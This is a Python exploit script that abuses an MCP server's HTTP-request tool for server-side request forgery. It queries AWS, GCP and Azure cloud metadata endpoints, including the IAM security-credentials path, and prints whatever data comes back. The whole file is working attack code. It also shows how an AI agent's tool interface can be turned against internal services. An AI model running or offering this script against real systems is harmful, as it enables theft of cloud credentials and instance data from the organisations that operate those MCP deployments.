#!/usr/bin/env python3
"""
MCP SSRF — Cloud Metadata Extraction via MCP Tools
"""
import requests
import json
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"

METADATA_ENDPOINTS = [
    # AWS
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/instance-id",
    "http://169.254.169.254/latest/meta-data/ami-id",
    # GCP
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/zone",
    "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    # Azure
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/attendedMSI?api-version=2019-08-01",
]

def test_via_mcp(target, endpoint):
    """Use MCP tool to fetch metadata endpoint"""
    payload = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "tools/call",
        "params": {
            "name": "http_request",  # Adjust to match target's actual tool name
            "arguments": {"url": endpoint}
        }
    }
    try:
        r = requests.post(f"{target}/mcp/call", json=payload, timeout=10)
        return r.json()
    except:
        return {}

def main():
    print(f"[*] MCP SSRF — Cloud Metadata Extraction")
    print(f"[*] Target: {TARGET}\n")
    
    confirmed = []
    for endpoint in METADATA_ENDPOINTS:
        print(f"[*] Testing: {endpoint}")
        result = test_via_mcp(TARGET, endpoint)
        result_str = json.dumps(result)
        
        if "AccessDenied" not in result_str and "error" not in result_str:
            if len(result_str) > 10:
                print(f"    [!] ACCESSIBLE: {endpoint}")
                print(f"    Data: {result_str[:300]}")
                confirmed.append((endpoint, result_str))
    
    if confirmed:
        print(f"\n[!] {len(confirmed)} metadata endpoints accessible via MCP")
        print("[!] Check results for IAM credentials or sensitive instance data")
    else:
        print("[-] No open metadata endpoints via this tool.")

if __name__ == "__main__":
    main()